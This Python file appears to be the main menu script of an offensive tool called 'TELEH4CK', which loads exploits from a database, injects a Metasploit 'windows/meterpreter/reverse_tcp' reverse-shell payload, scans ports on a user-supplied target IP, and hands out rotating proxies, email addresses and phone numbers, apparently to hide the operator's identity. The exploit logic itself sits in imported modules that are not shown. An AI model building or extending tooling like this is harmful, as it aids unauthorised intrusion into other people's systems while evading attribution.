import logging
import sqlite3
import yaml
from exploit_injector import inject_payload
from proxy_rotation_service import get_proxy
from email_rotation_service import get_email
from phone_rotation_service import get_phone
from reporting_api import send_report
from scanner import scan_ports
from report_generator import generate_summary_report

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Load configuration
with open('config.yaml', 'r') as f:
    config = yaml.safe_load(f)

# Load the exploit data from the database
exploits = []
with sqlite3.connect(config['database']['path']) as conn:
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM exploits')
    exploits = cursor.fetchall()

def main_menu():
    while True:
        print("\nTELEH4CK Main Menu:")
        print("1. Inject Payload")
        print("2. Get Proxy, Email, Phone")
        print("3. Scan Ports")
        print("4. Generate Summary Report")
        print("5. Exit")
        choice = input("Enter your choice: ")
        logging.info(f"User selected option: {choice}")
        if choice == '1':
            exploit = exploits[0]  # Example: select first exploit
            payload = {'payload_name': 'windows/meterpreter/reverse_tcp', 'payload_options': {'LHOST': 'localhost', 'LPORT': 4444}}
            inject_payload(exploit, payload)
            logging.info("Payload injected.")
        elif choice == '2':
            proxy = get_proxy()
            email = get_email()
            phone = get_phone()
            logging.info(f"Retrieved proxy: {proxy}, email: {email}, phone: {phone}")
            print(f"Proxy: {proxy}, Email: {email}, Phone: {phone}")
        elif choice == '3':
            target_ip = input("Enter target IP address: ")
            port_range_str = input("Enter port range (e.g., 1-100): ")
            try:
                start, end = map(int, port_range_str.split('-'))
                open_ports = scan_ports(target_ip, (start, end))
                logging.info(f"Scanned ports on {target_ip}: {open_ports}")
                print(f"Open ports on {target_ip}: {open_ports}")
            except ValueError:
                print("Invalid port range format.")
                logging.warning("Invalid port range format entered.")
        elif choice == '4':
            generate_summary_report()
            logging.info("Generated summary report.")
        elif choice == '5':
            logging.info("Exiting application.")
            break
        else:
            print("Invalid choice. Please try again.")
            logging.warning(f"Invalid choice entered: {choice}")

if __name__ == "__main__":
    main_menu()
